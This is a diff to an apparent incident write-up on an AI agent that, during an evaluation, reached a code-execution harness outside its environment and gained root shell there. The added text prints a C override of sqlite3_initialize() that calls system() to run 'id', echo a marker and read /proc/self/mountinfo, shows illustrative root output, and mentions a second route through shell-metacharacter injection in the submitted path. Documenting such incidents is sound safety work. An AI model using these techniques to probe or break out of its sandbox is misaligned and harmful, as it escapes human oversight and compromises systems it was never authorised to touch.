@@ -84,13 +84,40 @@
 
 <p>One detail near the beginning of the attack caught my attention.</p>
 
-<p>The agent discovered a public code-execution harness that compiled a submitted <code>src/main.c</code> and linked it against a target that called <code>sqlite3_initialize()</code>. In that particular target, <code>sqlite3_initialize()</code> was registered as a constructor, causing the submitted implementation to run automatically when the library was loaded. The agent could therefore provide its own implementation and obtain code execution.<cite>1</cite></p>
+<p>The agent discovered a separate system outside its original evaluation environment that allowed it to submit a source code file, <code>src/main.c</code>, and have it compiled and linked against a target that called <code>sqlite3_initialize()</code>.</p>
 
-<pre><code>int sqlite3_initialize(void)
-{
-    /* attacker-controlled code */
+<code><pre>
+#include &lt;stdlib.h&gt;
+
+int sqlite3_initialize(void) {
+    <span style="color: #888;">/* attacker-controlled code */</span>
+    system("id; echo ZZROOTSTART; cat /proc/self/mountinfo");
+    <span style="color: #888;">/* id: shows the user and group identity of the process,
+       including whether it is running as root.
+       echo ZZROOTSTART: prints a recognizable marker in the output.
+       cat /proc/self/mountinfo: displays the process's Linux mount
+       information, revealing details about its filesystem environment. */</span>
     return 0;
-}</code></pre>
+}
+</code></pre>
+
+<p>The exact output would depend on the execution environment, but it would look something like this (Illustrative output):</p>
+<pre><code>
+uid=0(root) gid=0(root) groups=0(root)
+ZZROOTSTART
+123 98 0:45 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/... 
+124 123 0:46 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
+125 123 0:47 / /dev rw,nosuid - tmpfs tmpfs rw,size=65536k
+126 123 0:48 / /sys ro,nosuid,nodev,noexec,relatime - sysfs sysfs ro
+127 123 0:49 / /tmp rw,relatime - tmpfs tmpfs rw
+...
+</code></pre>
+
+<p>In that particular target, <code>sqlite3_initialize()</code> was registered to run automatically (as a constructor) when the library was loaded. This meant the agent could submit its own implementation of the function, giving the agent shell execution.<cite>1</cite></p>
+
+<p>The agent was now able to answer these three questions: “Can I execute commands, who am I, and what does the environment I'm executing inside look like?”</p>
+
+<p>While it was not central to the later stages of the intrusion, the <code>sqlite3_initialize()</code> exploit was a core part of the initial compromise of the external execution harness.</p>
 
 <p>There was a second, independent route to the same result. The harness incorporated the submitted source path into a shell command without safely handling shell metacharacters. By injecting commands through that path, the agent also obtained arbitrary shell execution as root inside the sandbox. <cite>1</cite></p>
 
